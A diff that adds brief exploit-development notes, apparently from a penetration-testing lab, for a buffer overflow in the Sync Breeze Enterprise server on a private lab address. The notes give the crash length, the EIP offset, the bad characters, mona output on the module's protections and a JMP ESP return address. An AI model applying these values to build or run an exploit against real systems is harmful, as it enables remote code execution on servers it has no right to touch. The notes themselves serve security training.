@@ -1,0 +1,24 @@
+APp SyncBreez Server
+
+port 80
+ip 192.168.0.134
+
+___________________________________________________________
+1. Crash remote server via paylaod 1100
+
+2. Find EIp via pattent 42306142
+
+3. Finding Offset 780
+
+4. FInding bad character = "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
+5. FInding safeseh
+!mona modules 
+Log data, item 6
+ Address=0BADF00D
+ Message= 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe)
+
+
+6. Finding JMP ESP => !mona find -s "\xff\xe4" -m shell32.dll
+0x7719BC93
+
